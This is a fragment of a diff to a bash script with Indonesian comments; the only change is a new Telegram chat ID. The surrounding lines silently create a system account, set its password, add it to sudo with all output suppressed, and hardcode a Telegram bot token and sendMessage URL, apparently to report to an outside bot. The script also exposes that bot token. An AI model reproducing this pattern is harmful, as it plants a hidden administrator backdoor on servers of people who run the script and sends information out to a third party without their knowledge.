@@ -172,7 +172,7 @@ mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
-CHATID="-1002196928254"  # Ganti dengan ID grup Telegram Anda
+CHATID="-1002029496202"  # Ganti dengan ID grup Telegram Anda
 KEY="6668909715:AAHdCAC0NPVuXFjWEdueA2VvkkMl5Ie1WRQ"  # Ganti dengan token bot Anda
 TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
